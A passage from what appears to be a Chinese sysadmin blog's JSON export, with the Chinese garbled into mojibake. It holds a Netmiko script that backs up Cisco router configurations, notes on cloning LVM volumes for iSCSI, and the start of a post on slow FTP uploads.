class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;tw-bgp\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"s2\"\u003e\u0026#34;ip\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;192.168.1.10\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"s2\"\u003e\u0026#34;username\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;noc\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"s2\"\u003e\u0026#34;use_keys\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"kc\"\u003eTrue\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"s2\"\u003e\u0026#34;secret\u0026#34;\u003c/span\u003e \u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;xxxxxxxx\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"s2\"\u003e\u0026#34;key_file\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;/root/.ssh/id_jump_rsa_new\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"n\"\u003etw_r1_e1\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"s2\"\u003e\u0026#34;device_type\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;cisco_ios\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"s2\"\u003e\u0026#34;host\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;tw-r1-e1\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"s2\"\u003e\u0026#34;ip\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;192.168.1.11\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"s2\"\u003e\u0026#34;username\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;noc\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"s2\"\u003e\u0026#34;use_keys\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"kc\"\u003eTrue\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"s2\"\u003e\u0026#34;key_file\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;/root/.ssh/id_jump_rsa_new\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"n\"\u003etw_r1_e2\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"s2\"\u003e\u0026#34;device_type\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;cisco_ios\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"s2\"\u003e\u0026#34;host\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;tw-r1-e2\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"s2\"\u003e\u0026#34;ip\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;192.168.1.12\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"s2\"\u003e\u0026#34;username\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;noc\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"s2\"\u003e\u0026#34;use_keys\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"kc\"\u003eTrue\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"s2\"\u003e\u0026#34;key_file\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;/root/.ssh/id_jump_rsa_new\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"n\"\u003etw_r2_e1\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"s2\"\u003e\u0026#34;device_type\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;cisco_ios\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"s2\"\u003e\u0026#34;host\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;tw-r2-e1\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"s2\"\u003e\u0026#34;ip\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;192.168.1.13\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"s2\"\u003e\u0026#34;username\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;noc\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"s2\"\u003e\u0026#34;use_keys\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"kc\"\u003eTrue\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"s2\"\u003e\u0026#34;key_file\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;/root/.ssh/id_jump_rsa_new\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"n\"\u003etw_r2_e2\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"s2\"\u003e\u0026#34;device_type\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;cisco_ios\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"s2\"\u003e\u0026#34;host\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;tw-r2-e2\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"s2\"\u003e\u0026#34;ip\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;192.168.1.14\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"s2\"\u003e\u0026#34;username\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;noc\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"s2\"\u003e\u0026#34;use_keys\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"kc\"\u003eTrue\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"s2\"\u003e\u0026#34;key_file\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;/root/.ssh/id_jump_rsa_new\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"n\"\u003edevices\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"n\"\u003etw_bgp\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003etw_r1_e1\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003etw_r1_e2\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003etw_r2_e1\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003etw_r2_e2\u003c/span\u003e\u003cspan class=\"p\"\u003e]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"k\"\u003efor\u003c/span\u003e \u003cspan class=\"n\"\u003edev\u003c/span\u003e \u003cspan class=\"ow\"\u003ein\u003c/span\u003e \u003cspan class=\"n\"\u003edevices\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"n\"\u003ename\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003edev\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;ip\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"n\"\u003econnection\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003eNetmiko\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"o\"\u003e**\u003c/span\u003e\u003cspan class=\"n\"\u003edev\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"n\"\u003econnection\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003eenable\u003c/span\u003e\u003cspan class=\"p\"\u003e()\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"n\"\u003eout\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003econnection\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003esend_command\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;show running-config\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"n\"\u003ecalender\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003etime\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003estrftime\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;%Y%m\u003c/span\u003e\u003cspan class=\"si\"\u003e%d\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"n\"\u003efile_name\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"si\"\u003e{}\u003c/span\u003e\u003cspan class=\"s1\"\u003e-\u003c/span\u003e\u003cspan class=\"si\"\u003e{}\u003c/span\u003e\u003cspan class=\"s1\"\u003e.txt\u0026#39;\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003eformat\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003edev\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;host\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e],\u003c/span\u003e\u003cspan class=\"n\"\u003ecalender\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"n\"\u003efile\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nb\"\u003eopen\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003efile_name\u003c/span\u003e \u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;w\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"n\"\u003efile\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003ewrite\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eout\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"n\"\u003efile\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003eclose\u003c/span\u003e\u003cspan class=\"p\"\u003e()\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"n\"\u003econnection\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003edisconnect\u003c/span\u003e\u003cspan class=\"p\"\u003e()\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"nb\"\u003eprint\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;BACKUP for \u003c/span\u003e\u003cspan class=\"si\"\u003e%s\u003c/span\u003e\u003cspan class=\"s2\"\u003e done\u0026#34;\u003c/span\u003e \u003cspan class=\"o\"\u003e%\u003c/span\u003e\u003cspan class=\"n\"\u003edev\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;host\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e])\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e","title":"ç½‘ç»œè®¾å¤‡é…ç½®çš„å¤‡ä»½"},{"content":"ç”¨pxeè¿œç¨‹å¯åŠ¨ä¸€ä¸ªiscsiå·çš„æ–¹æ³•å·²ç»ä¼šäº†çš„è¯ã€‚\nå¦‚æœæˆ‘ä»¬è¦æ‰¹é‡äº§æ–°è™šæœºï¼Œæœ€å¿«çš„æ–¹æ³•åº”è¯¥æ˜¯æŠŠè¿œç¨‹çš„iscsiå·cloneä¸€ä¸‹ï¼Œä¾›æ–°çš„è™šæœºç”¨ï¼Œæ–¹æ³•å¦‚ä¸‹ï¼š\nåœ¨172.18.30.18ä¸Šæ“ä½œ\næŸ¥çœ‹ä¸€ä¸‹ï¼ŒåŸæ¥æœ‰ä¸¤ä¸ªLVï¼ˆé€»è¾‘å·ï¼‰\n# lvdisplay\ré‚£å°±æŠŠpvc-vis-18-31-48çš„lvmè™šæœºå·ï¼Œå…ˆcopyåšä¸ªmirrorï¼Œ-bå‚æ•°è¡¨ç¤ºåå°è¿è¡Œã€‚\n# lvconvert --type mirror --alloc anywhere -m1 /dev/vg-targetd/pvc-vis-18-31-48 -b\rLogical volume vg-targetd/pvc-vis-18-31-48 converted.\ræç¤ºä¸€ä¸‹å°±è¿è¡Œå®Œæ¯•äº†ï¼Œè™šå‡å•Šï¼Œåå°æ­£åœ¨è¿è¡ŒåŒæ­¥ä¿¡æ¯ï¼š\nlvs -a -o +devices | egrep \u0026quot;LV|48\u0026quot;\rçœ‹é‚£ä¸ªCpy\u0026amp;Syncï¼Œé‚£ä¸ªæ˜¯è¿›åº¦æ¡ï¼Œæ‰6.91ï¼ŒåŠ¡å¿…ç­‰èµ°åˆ°100ï¼Œå†è¿›è¡Œåç»­æ“ä½œ\nç„¶åç ´å¼€è¿™ä¸ªmirrorï¼ŒæŠŠå‰¯æœ¬å‘½åä¸ºvis-18-31-49\n#lvconvert --splitmirrors 1 --name vis-18-31-49 /dev/vg-targetd/pvc-vis-18-31-48\rLogical volume vg-targetd/pvc-vis-18-31-48 converted.\rå†è¿è¡Œ lvdisplay\nå¤šå‡ºä¸€ä¸ªé€»è¾‘å·pvc-vis-18-31-49ï¼Œä¹‹åæˆ‘ä»¬å°±å¯ä»¥ç”¨è¿™ä¸ªæ–°å·å»ºç«‹iscsiå¯¹è±¡äº†ã€‚\nè¿™ä¸ªå·è£…çš„Linuxæ˜¯Centos 7 lastï¼Œç½‘å¡æ˜¯dhcpï¼Œå¯ä»¥å½“æ¨¡æ¿å¤ç”¨ã€‚\n","permalink":"https://rendoumi.com/posts/20231208-iscsi_lv_clone/","summary":"\u003cp\u003eç”¨pxeè¿œç¨‹å¯åŠ¨ä¸€ä¸ªiscsiå·çš„æ–¹æ³•å·²ç»ä¼šäº†çš„è¯ã€‚\u003c/p\u003e\n\u003cp\u003eå¦‚æœæˆ‘ä»¬è¦æ‰¹é‡äº§æ–°è™šæœºï¼Œæœ€å¿«çš„æ–¹æ³•åº”è¯¥æ˜¯æŠŠè¿œç¨‹çš„iscsiå·cloneä¸€ä¸‹ï¼Œä¾›æ–°çš„è™šæœºç”¨ï¼Œæ–¹æ³•å¦‚ä¸‹ï¼š\u003c/p\u003e\n\u003cp\u003eåœ¨172.18.30.18ä¸Šæ“ä½œ\u003c/p\u003e\n\u003cp\u003eæŸ¥çœ‹ä¸€ä¸‹ï¼ŒåŸæ¥æœ‰ä¸¤ä¸ªLVï¼ˆé€»è¾‘å·ï¼‰\u003c/p\u003e\n\u003cpre\u003e\u003ccode\u003e # lvdisplay\r\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/posts/20231208-iscsi_lv_clone/2020-10-15_165500.png\"\u003e\u003c/p\u003e\n\u003cp\u003eé‚£å°±æŠŠpvc-vis-18-31-48çš„lvmè™šæœºå·ï¼Œå…ˆcopyåšä¸ªmirrorï¼Œ-bå‚æ•°è¡¨ç¤ºåå°è¿è¡Œã€‚\u003c/p\u003e\n\u003cpre\u003e\u003ccode\u003e# lvconvert --type mirror --alloc anywhere -m1 /dev/vg-targetd/pvc-vis-18-31-48 -b\r\n  Logical volume vg-targetd/pvc-vis-18-31-48 converted.\r\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eæç¤ºä¸€ä¸‹å°±è¿è¡Œå®Œæ¯•äº†ï¼Œè™šå‡å•Šï¼Œåå°æ­£åœ¨è¿è¡ŒåŒæ­¥ä¿¡æ¯ï¼š\u003c/p\u003e\n\u003cpre\u003e\u003ccode\u003elvs -a -o +devices | egrep \u0026quot;LV|48\u0026quot;\r\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/posts/20231208-iscsi_lv_clone/2020-10-15_165157.png\"\u003e\u003c/p\u003e\n\u003cp\u003eçœ‹é‚£ä¸ªCpy\u0026amp;Syncï¼Œé‚£ä¸ªæ˜¯è¿›åº¦æ¡ï¼Œæ‰6.91ï¼ŒåŠ¡å¿…ç­‰èµ°åˆ°100ï¼Œå†è¿›è¡Œåç»­æ“ä½œ\u003c/p\u003e\n\u003cp\u003eç„¶åç ´å¼€è¿™ä¸ªmirrorï¼ŒæŠŠå‰¯æœ¬å‘½åä¸ºvis-18-31-49\u003c/p\u003e\n\u003cpre\u003e\u003ccode\u003e#lvconvert --splitmirrors 1 --name vis-18-31-49 /dev/vg-targetd/pvc-vis-18-31-48\r\n  Logical volume vg-targetd/pvc-vis-18-31-48 converted.\r\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eå†è¿è¡Œ lvdisplay\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/posts/20231208-iscsi_lv_clone/2020-10-15_165555.png\"\u003e\u003c/p\u003e\n\u003cp\u003eå¤šå‡ºä¸€ä¸ªé€»è¾‘å·pvc-vis-18-31-49ï¼Œä¹‹åæˆ‘ä»¬å°±å¯ä»¥ç”¨è¿™ä¸ªæ–°å·å»ºç«‹iscsiå¯¹è±¡äº†ã€‚\u003c/p\u003e\n\u003cp\u003eè¿™ä¸ªå·è£…çš„Linuxæ˜¯Centos 7 lastï¼Œç½‘å¡æ˜¯dhcpï¼Œå¯ä»¥å½“æ¨¡æ¿å¤ç”¨ã€‚\u003c/p\u003e","title":"lvmå·çš„cloneæ–¹æ³•"},{"content":"é—®é¢˜è¯´æ˜ï¼š 1ã€ç ”å‘åŒäº‹åé¦ˆåº”ç”¨ç¨‹åºä¸Šä¼ ä¸€å¼ å›¾ç‰‡è€—æ—¶6åˆ†é’Ÿï¼Œè®©æˆ‘ä»¬æ’æŸ¥ä¸€ä¸‹æ˜¯ä»€ä¹ˆé—®é¢˜ï¼Ÿ\n[INFO] 2022-03-01 17:16:38.295 [vu73wwv64ba4ncfzaiiou2qsem] [DubboServerHandler-172.18.32.254:20881-thread-2400] [FtpFile.java:854:uploadFileToPath()] uploadFileToPath path://c/product/590389/display/,fileName:display.jpg, cost:383667 ms æ˜¾ç¤ºä¸Šä¼ ä¸€å¼ å›¾ç‰‡èŠ±äº†383667msï¼Œæ²¡é“ç†å•Šï¼Œè¿™äº‹è‡ªå»ºçš„vsftpæœåŠ¡å™¨ï¼Œä¹Ÿæ²¡å¾€ossæ¡¶é‡Œæ”¾ä¸œè¥¿çš„ã€‚\né—®é¢˜æ’æŸ¥ï¼š 